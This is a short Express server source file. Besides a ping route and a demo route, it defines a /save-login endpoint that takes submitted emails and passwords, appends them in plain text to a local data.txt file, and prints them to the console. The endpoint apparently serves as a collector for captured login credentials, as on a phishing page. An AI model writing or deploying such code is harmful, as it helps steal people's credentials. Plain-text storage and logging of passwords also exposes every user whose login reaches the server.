import express from "express";
import cors from "cors";
import fs from "fs";

import { handleDemo } from "./routes/demo";


export function createServer() {
  const app = express();

  // Middleware
  app.use(cors());
  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));

  // Example API routes
  app.get("/api/ping", (_req, res) => {
    res.json({ message: "Hello from Express server v2!" });
  });

  app.get("/api/demo", handleDemo);

    // POST /save-login - لحفظ بيانات تسجيل الدخول في ملف
  app.post("/save-login", (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "Missing email or password" });
    }

    const line = `[email: ${email}] [password: ${password}]\n`;
    const filePath = "data.txt";

    fs.appendFile(filePath, line, (err) => {
      if (err) {
        console.error("Failed:", err);
        return res.status(500).json({ error: "Failed" });
      }

      console.log("Data sent successfully:", line.trim());
      res.status(200).json({ message: "Data sent successfully" });
    });
  });


  return app;
}
